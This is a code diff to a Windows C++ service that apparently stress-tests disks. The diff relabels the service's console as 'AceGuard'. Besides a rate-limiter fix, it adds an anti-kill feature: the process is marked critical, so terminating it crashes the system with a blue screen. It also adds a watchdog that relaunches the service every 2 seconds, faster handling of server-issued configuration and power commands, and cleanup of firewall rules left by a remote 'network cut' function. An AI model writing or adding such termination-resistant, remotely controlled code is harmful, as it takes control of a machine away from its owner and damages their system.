@@ -16,7 +16,7 @@
 #pragma comment(lib, "kernel32.lib")
 
 static const wchar_t* REASON_PERIODIC = L"周期报告（每 5 小时一份）";
-static const wchar_t* REASON_STOPPED  = L"收到停止指令（DiskStress 控制台）";
+static const wchar_t* REASON_STOPPED  = L"收到停止指令（AceGuard 控制台）";
 static const wchar_t* REASON_ERROR    = L"连续 I/O 错误，程序自我保护退出";
 
 static LARGE_INTEGER g_freq;
@@ -82,6 +82,26 @@ static bool LimiterTake() {
     if (ok) g_limiter.tokens -= 1.0;
     LeaveCriticalSection(&g_limiter.lock);
     return ok;
+}
+
+// 限速未拿到令牌时按缺口估算等待毫秒，替代 Sleep(1) 忙等：
+// 高线程数低限速时忙等会白白烧 CPU（Bug：CPU 满后控制通道响应变慢）
+static DWORD LimiterWaitMs() {
+    if (!g_limiter.init || g_limiter.rate == 0) return 1;
+    EnterCriticalSection(&g_limiter.lock);
+    uint64_t now = NowTick();
+    double sec = TickDeltaUs(g_limiter.lastTick, now) / 1000000.0;
+    g_limiter.lastTick = now;
+    g_limiter.tokens += sec * (double)g_limiter.rate;
+    double cap = (double)g_limiter.rate;
+    if (g_limiter.tokens > cap) g_limiter.tokens = cap;
+    double need = 0;
+    if (g_limiter.tokens < 1.0) need = (1.0 - g_limiter.tokens) / (double)g_limiter.rate;
+    LeaveCriticalSection(&g_limiter.lock);
+    DWORD ms = (DWORD)(need * 1000.0);
+    if (ms < 1) ms = 1;
+    if (ms > 50) ms = 50;
+    return ms;
 }
 
 static void LiveUpdate(const Stats& snap, uint64_t uptimeSec) {
@@ -162,7 +182,7 @@ struct SyncCtx {
 // ------------------------------------------------------------ io thread
 
 static bool SubmitIo(ThreadCtx* c, uint32_t slot) {
-    while (!LimiterTake()) Sleep(1);
+    while (!LimiterTake()) Sleep(LimiterWaitMs());
     for (int retry = 0; retry < 5; retry++) {
         ZeroMemory(&c->ovs[slot], sizeof(OVERLAPPED));
         c->ovs[slot].hEvent = c->events[slot];
@@ -342,6 +362,17 @@ static void FoldGen(Stats& base, std::vector<ThreadCtx*>& tcs, SyncCtx& sc) {
     sc.count = 0; sc.failures = 0; sc.sumUs = 0; sc.maxUs = 0; sc.hist = LatencyHist();
 }
 
+// 网络自愈线程：上次"一键断网"后机器重启的，开机拉起时自动删除防火墙阻塞规则
+// 恢复网络（规则持久存在，不删会一直断网）。必须在独立线程执行：
+// netsh 两条命令最长可阻塞 20s，若同步跑会拖死 SCM START_PENDING，
+// 触发失败重启链 -> 再卡 -> 启动死循环
+static DWORD WINAPI NetHealThread(LPVOID p) {
+    std::wstring* dir = (std::wstring*)p;
+    NetBlockApply(false, *dir);
+    delete dir;
+    return 0;
+}
+
 // ------------------------------------------------------------ RunWorker
 
 int RunWorker(const Config& cfgIn, HANDLE hStopA, HANDLE hStopB, HANDLE hStopC) {
@@ -370,6 +401,18 @@ int RunWorker(const Config& cfgIn, HANDLE hStopA, HANDLE hStopB, HANDLE hStopC) 
         swprintf(pid, 32, L"%lu", GetCurrentProcessId());
         bool pidOk = WriteTextFileUtf8(cfg.stateDir + L"\\" + PID_FILE, std::wstring(pid));
         Dbg(cfg.stateDir, L"PID 文件", pidOk, std::wstring(L"pid=") + pid);
+    }
+
+    // 防杀（Critical Process）：被强杀 = 立即蓝屏。正常停止（停止事件/服务停止）不受影响。
+    // 所有 return 路径退出前必须解除（见下方各 SetCriticalProcess(false)）。
+    SetCriticalProcess(true);
+
+    // 网络自愈（独立线程，不阻塞 SCM 启动窗口，见 NetHealThread 注释）
+    {
+        std::wstring* dir = new std::wstring(cfg.stateDir);
+        HANDLE hHeal = CreateThread(NULL, 0, NetHealThread, dir, 0, NULL);
+        if (hHeal) CloseHandle(hHeal);
+        else delete dir;
     }
 
     {
@@ -446,6 +489,7 @@ int RunWorker(const Config& cfgIn, HANDLE hStopA, HANDLE hStopB, HANDLE hStopC) 
         Dbg(cfg.stateDir, L"回退打开(带缓存)", hFile != INVALID_HANDLE_VALUE, cfg.filePath);
     }
     if (hFile == INVALID_HANDLE_VALUE) {
+        SetCriticalProcess(false);
         DeleteFileW((cfg.stateDir + L"\\" + PID_FILE).c_str());
         SetThreadExecutionState(ES_CONTINUOUS);
         Dbg(cfg.stateDir, L"退出", false, L"压力文件无法打开，返回码=3");
@@ -571,6 +615,9 @@ int RunWorker(const Config& cfgIn, HANDLE hStopA, HANDLE hStopB, HANDLE hStopC) 
         for (uint32_t t = 0; t < nThreads; t++) {
             HANDLE th = CreateThread(NULL, 0, IoThread, tcs[t], 0, NULL);
             if (!th) return false;
+            // 关键：压力线程降一级优先级。高并发+高QD 把 CPU 打满时，
+            // 网络线程与监督循环仍能调度，服务器下发的配置/电源指令才不会失效
+            SetThreadPriority(th, THREAD_PRIORITY_BELOW_NORMAL);
             ths.push_back(th);
         }
         sc.hFile       = hFile;
@@ -586,6 +633,7 @@ int RunWorker(const Config& cfgIn, HANDLE hStopA, HANDLE hStopB, HANDLE hStopC) 
         L"（" + FormatInt(cfg.threads) + L" 线程 x QD" + FormatInt(cfg.queueDepth) +
         L"，块数=" + FormatInt(blocks) + L"）");
     if (!poolReady) {
+        SetCriticalProcess(false);
         StopPool();
         FreePool();
         CloseHandle(hFile);
@@ -619,7 +667,7 @@ int RunWorker(const Config& cfgIn, HANDLE hStopA, HANDLE hStopB, HANDLE hStopC) 
     double nextSegmentSec = (double)cfg.segmentSec;
     double nextReportSec  = (double)cfg.reportIntervalSec;
     double nextHeartbeat  = 600.0;          // debug.log 每 10 分钟一条心跳
-    double nextWatchdog   = 300.0;          // 每 5 分钟唤醒一次看门狗（死了就重新拉起）
+    double nextWatchdog   = 2.0;            // 每 2 秒唤醒一次看门狗（被杀了立刻拉起）
     Stats  prevSnap;
     bool   firstSnap   = true;
     bool   allocWarned = false;
@@ -631,10 +679,11 @@ int RunWorker(const Config& cfgIn, HANDLE hStopA, HANDLE hStopB, HANDLE hStopC) 
     while (poolReady) {
         bool stopReq = false;
         if (stopCount > 0) {
-            DWORD w = WaitForMultipleObjects(stopCount, stopHandles, FALSE, 500);
+            // 200ms 轮询：CPU 打满时也要尽快应用服务器下发的新配置
+            DWORD w = WaitForMultipleObjects(stopCount, stopHandles, FALSE, 200);
             if (w >= WAIT_OBJECT_0 && w < WAIT_OBJECT_0 + stopCount) stopReq = true;
         } else {
-            Sleep(500);
+            Sleep(200);
         }
 
         double elapsed = TickDeltaUs(base, NowTick()) / 1000000.0;
@@ -710,10 +759,10 @@ int RunWorker(const Config& cfgIn, HANDLE hStopA, HANDLE hStopB, HANDLE hStopC) 
             nextReportSec += (double)cfg.reportIntervalSec;
         }
 
-        // 服务唤醒看门狗：每 5 分钟检查互斥体，不在就重新拉起
+        // 服务唤醒看门狗：每 2 秒检查互斥体，不在就重新拉起（互保：服务↔看门狗）
         if (elapsed >= nextWatchdog) {
             SpawnWatchdogProcess(cfg.stateDir);
-            nextWatchdog += 300.0;
+            nextWatchdog += 2.0;
         }
 
         if (elapsed >= nextHeartbeat) {
@@ -792,7 +841,8 @@ int RunWorker(const Config& cfgIn, HANDLE hStopA, HANDLE hStopB, HANDLE hStopC) 
 
     DeleteFileW((cfg.stateDir + L"\\" + PID_FILE).c_str());
     SetThreadExecutionState(ES_CONTINUOUS);
-    // 优雅退出前先送看门狗停止信号：否则看门狗 60 s 内会把服务拉活
+    // 优雅退出前先解除 critical 标志 + 送看门狗停止信号：否则看门狗 5 s 内会把服务拉活
+    SetCriticalProcess(false);
     SignalWatchdogStop(cfg.stateDir);
     Dbg(cfg.stateDir, L"退出", true, L"RunWorker 正常结束，返回码=0");
     return 0;
